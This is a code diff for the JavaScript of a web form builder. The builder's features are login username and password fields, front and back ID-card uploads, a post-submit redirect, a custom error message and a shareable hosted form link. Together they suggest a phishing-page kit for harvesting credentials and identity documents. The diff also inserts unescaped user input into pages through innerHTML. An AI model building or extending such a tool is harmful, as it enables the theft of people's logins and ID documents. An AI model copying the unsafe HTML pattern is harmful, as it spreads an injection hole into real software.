-      btn.textContent = $("generateBtnText").value; fDiv.appendChild(btn);
-    }
+    /* Forms */
+const fDiv=document.createElement("div");
+fDiv.style.display="flex";
+fDiv.style.flexDirection="column";
+fDiv.style.gap="8px";
 
-    c.appendChild(fDiv);
+if ($("addAuth").checked) {
+  fDiv.innerHTML+=`<input placeholder="${$("usernamePlaceholder").value}">`;
+  fDiv.innerHTML+=`<input type="password" placeholder="${$("passwordPlaceholder").value}">`;
+}
 
-    // -------------------------
-    // Extra Draggable Buttons
-    // -------------------------
-    extraButtons.forEach(b=>{
-      if(!b.show) return;
-      const btn=document.createElement("button");
-      btn.className="draggableBtn"; btn.textContent=b.text;
-      btn.style.background=b.color; btn.style.width=b.size+"px"; btn.style.height=b.size+"px";
-      btn.style.position="absolute"; btn.style.left=b.x+"%"; btn.style.top=b.y+"%";
-      btn.onmousedown=e=>{dragging=b; dx=e.offsetX; dy=e.offsetY;};
-      btn.onclick=()=>window.open(b.link,"_blank");
-      p.appendChild(btn);
-    });
+$("extraFields").value.split("\n").filter(Boolean).forEach(f=>{
+  fDiv.innerHTML+=`<input placeholder="${f}">`;
+});
 
-    // Footer
-    const footer = document.createElement("footer");
-    footer.style.textAlign="center"; footer.style.marginTop="10px"; footer.style.fontSize="12px";
-    footer.textContent = $("footerText").value;
+// ✅ Custom fields preview
+customFields.forEach(fld => {
+  const input = document.createElement("input");
+  input.type = fld.type;
+  input.placeholder = fld.label;
+  fDiv.appendChild(input);
+});
+    
+    /* -------------------------
+   ID Upload (Front / Back)
+------------------------- */
+if ($("chkIdFront")?.checked || $("chkIdBack")?.checked) {
+  const idBox = document.createElement("div");
+  idBox.style.border = "1px dashed #aaa";
+  idBox.style.borderRadius = "8px";
+  idBox.style.padding = "10px";
+  idBox.style.display = "flex";
+  idBox.style.flexDirection = "column";
+  idBox.style.gap = "6px";
+
+  if ($("chkIdFront")?.checked) {
+    const lbl = document.createElement("label");
+    lbl.textContent = $("txtIdFront")?.value || "Upload ID Front";
+
+    const inp = document.createElement("input");
+    inp.type = "file";
+
+    idBox.appendChild(lbl);
+    idBox.appendChild(inp);
+  }
+
+  if ($("chkIdBack")?.checked) {
+    const lbl = document.createElement("label");
+    lbl.textContent = $("txtIdBack")?.value || "Upload ID Back";
+
+    const inp = document.createElement("input");
+    inp.type = "file";
+
+    idBox.appendChild(lbl);
+    idBox.appendChild(inp);
+  }
+
+  // 🔴 THIS IS WHY IT APPEARS BEFORE BUTTONS
+  fDiv.appendChild(idBox);
+}
+    
+    /* =========================
+   Form section wrapper
+========================= */
+const formSection = document.createElement("div");
+formSection.className = "section";
+
+/* Form title */
+const formTitle = document.createElement("h3");
+formTitle.textContent = "🔐";
+formSection.appendChild(formTitle);
+
+/* Put form fields inside section */
+formSection.appendChild(fDiv);
+
+/* Add section to main content */
+c.appendChild(formSection);
+
+/* -------------------------
+   Extra Buttons Preview
+------------------------- */
+if (extraButtons.length) {
+  const btnWrap = document.createElement("div");
+  btnWrap.style.margin = "16px 0";
+  btnWrap.style.display = "flex";
+  btnWrap.style.flexDirection = "column";
+  btnWrap.style.gap = "10px";
+
+  extraButtons.forEach(btn => {
+    if (!btn.show) return;
+
+    const row = document.createElement("div");
+    row.style.display = "flex";
+    row.style.justifyContent =
+      btn.align === "left" ? "flex-start" :
+      btn.align === "right" ? "flex-end" :
+      "center";
+
+    const a = document.createElement("a");
+    a.textContent = btn.text;
+    a.href = btn.link || "#";
+    a.target = "_blank";
+    a.style.background = btn.color;
+    a.style.color = "#fff";
+    a.style.padding = "10px 16px";
+    a.style.borderRadius = "8px";
+    a.style.fontSize = btn.size + "px";
+    a.style.textDecoration = "none";
+    a.style.cursor = "move";
+    a.style.position = "relative";
+
+    // delete button
+    const del = document.createElement("span");
+    del.textContent = "✖";
+    del.style.marginLeft = "8px";
+    del.style.cursor = "pointer";
+    del.style.color = "#900";
+    del.onclick = () => deleteExtraButton(btn.id);
+
+    a.appendChild(del);
+    row.appendChild(a);
+    btnWrap.appendChild(row);
+  });
+  
+  c.appendChild(btnWrap);
+}    
+
+if ($("showGenerateBtn")?.checked) {
+  const genBtn = document.createElement("button");
+  genBtn.textContent = $("generateBtnText").value || "Generate";
+  genBtn.style.background = "#1976d2";
+  genBtn.style.color = "#fff";
+  genBtn.style.border = "none";
+  genBtn.style.padding = "10px";
+  genBtn.style.borderRadius = "8px";
+  fDiv.appendChild(genBtn);
+}
+
+/* Submit button AFTER */
+if ($("showMainBtn").checked) {
+  const btn = document.createElement("button");
+  btn.textContent = $("buttonText").value;
+  btn.style.background = $("btnColor").value;
+  btn.style.color = "#fff";
+  fDiv.appendChild(btn);
+}
+
+    /* Footer */
+    const footer=document.createElement("footer");
+    footer.style.textAlign="center";
+    footer.style.fontSize="12px";
+    footer.textContent=$("footerText").value;
     c.appendChild(footer);
 
     p.appendChild(c);
+    
+ /* -------------------------
+   Draggable Lines (FINAL)
+------------------------- */
+draggableItems.forEach(line => {
+  if (!line.show) return;
 
-    // -------------------------
-    // Dragging logic
-    // -------------------------
-    document.onmousemove = e => { if(!dragging) return; const r=p.getBoundingClientRect(); dragging.x=((e.clientX-r.left-dx)/r.width)*100; dragging.y=((e.clientY-r.top-dy)/r.height)*100; renderPreview();};
-    document.onmouseup = () => dragging=null;
+  const el = document.createElement("div");
+  el.textContent = line.text;
+  el.dataset.dragId = line.id;
+
+  el.style.position = "absolute";
+  el.style.left = line.x + "%";
+  el.style.top  = line.y + "%";
+  el.style.zIndex = 9999;
+  el.style.cursor = "move";
+
+  el.style.color = line.color || "#000";
+  el.style.fontSize = ((line.size || 2) * 4) + "px";
+  el.style.lineHeight = "1";
+  el.style.background = "rgba(255,255,255,0.6)";
+  el.style.padding = "2px 6px";
+  el.style.borderRadius = "4px";
+  el.style.userSelect = "none";
+  el.style.whiteSpace = "nowrap";
+
+  // ✅ NEW: alignment
+  if (line.align === "center") {
+    el.style.transform = "translateX(-50%)";
+    el.style.textAlign = "center";
+  }
+  if (line.align === "right") {
+    el.style.transform = "translateX(-100%)";
+    el.style.textAlign = "right";
+  }
+  if (line.align === "left") {
+    el.style.transform = "none";
+    el.style.textAlign = "left";
+  }
+
+  el.onmousedown = e => {
+    dragging = line;
+    dx = e.offsetX;
+    dy = e.offsetY;
+  };
+
+  p.appendChild(el);
+});
 
   } catch(err) {
     console.error("Preview render error:", err);
@@ -943,16 +1255,48 @@ document.addEventListener("input", e => {
   }
 });
 
-document.addEventListener("change", e => {
-  if (e.target.closest(".wrap")) {
-    renderPreview();
-  }
-});
-
 function generateForm() {
   const frontUrl = $("idFrontFile")?.dataset.uploadedUrl || "";
   const backUrl = $("idBackFile")?.dataset.uploadedUrl || "";
 
+  // Collect form fields
+  const fields = [];
+
+  // Auth fields
+  if ($("addAuth").checked) {
+    fields.push({
+      type: "text",
+      name: "username",
+      label: "Username",
+      placeholder: $("usernamePlaceholder").value
+    });
+    fields.push({
+      type: "password",
+      name: "password",
+      label: "Password",
+      placeholder: $("passwordPlaceholder").value
+    });
+  }
+
+  // Extra fields
+  $("extraFields").value.split("\n").map(f => f.trim()).filter(Boolean).forEach(f => {
+    fields.push({ type: "text", label: f, name: f.replace(/\s+/g,'_').toLowerCase(), placeholder: f });
+  });
+
+  // Custom fields
+  customFields.forEach(fld => {
+    fields.push({ type: fld.type, label: fld.label, name: fld.label.replace(/\s+/g,'_').toLowerCase(), placeholder: fld.label });
+  });
+
+  // Add ID upload fields
+  if ($("chkIdFront").checked) {
+    fields.push({ type: "file", label: $("txtIdFront").value, name: "id_front", url: frontUrl });
+  }
+  if ($("chkIdBack").checked) {
+    fields.push({ type: "file", label: $("txtIdBack").value, name: "id_back", url: backUrl });
+  }
+
+  // Save form data
   const formData = {
     seoTitle: $("seoTitle").value,
     metaDesc: $("metaDesc").value,
@@ -967,36 +1311,25 @@ function generateForm() {
     description: $("description").value,
     galleryImages: $("galleryImages").value.split(",").map(i => i.trim()).filter(Boolean),
     galleryItems,
+    videoLinks: $("videoLinks").value.split(",").map(i => i.trim()).filter(Boolean),
     bgImageURL: $("bgImageURL").value,
     bgVideoURL: $("bgVideoURL").value,
     bgSize: $("bgSize").value,
     enableWarning: $("enableWarning").checked,
     warning: $("warning").value,
     warningPosition: $("warningPosition").value,
-    addAuth: $("addAuth").checked,
-    usernamePlaceholder: $("usernamePlaceholder").value,
-    passwordPlaceholder: $("passwordPlaceholder").value,
-    showCustomError: $("showCustomError")?.checked || false, // ✅ Fix
-    customErrorText: $("customErrorText")?.value || "",      // ✅ Fix
-    extraFields: $("extraFields").value.split("\n").map(i => i.trim()),
-    idFrontChk: $("chkIdFront").checked,
-    idBackChk: $("chkIdBack").checked,
-    idFrontUrl: frontUrl,
-    idBackUrl: backUrl,
-    customFields,
-    textColor: $("textColor").value,
-    bgColor: $("bgColor").value,
-    btnColor: $("btnColor").value,
     buttonText: $("buttonText").value,
+    btnColor: $("btnColor").value,
+    btnPosition: $("btnPosition").value,
     showMainBtn: $("showMainBtn").checked,
     showGenerateBtn: $("showGenerateBtn").checked,
     generateBtnText: $("generateBtnText").value,
-    btnPosition: $("btnPosition").value,
     extraButtons,
     embedLinks,
     enableRedirect: $("enableRedirect").checked,
     redirectURL: $("redirectURL").value,
     footerText: $("footerText").value,
+    fields, // ✅ All form fields stored here
     createdAt: new Date().toISOString()
   };
 
@@ -1004,7 +1337,7 @@ function generateForm() {
     .then(docRef => {
       const linkArea = $("linkArea");
       const formLink = `${window.location.origin}/form.html?id=${docRef.id}`;
-      linkArea.innerHTML = `<p>✅ Form generated! Copy your link:</p>
+      linkArea.innerHTML = `<p style="color:blue; font-weight:bold;">✅ Form generated! Copy your link:</p>
                             <input type="text" value="${formLink}" style="width:100%" readonly>
                             <button onclick="navigator.clipboard.writeText('${formLink}')">Copy Link</button>`;
       linkArea.style.display = "block";
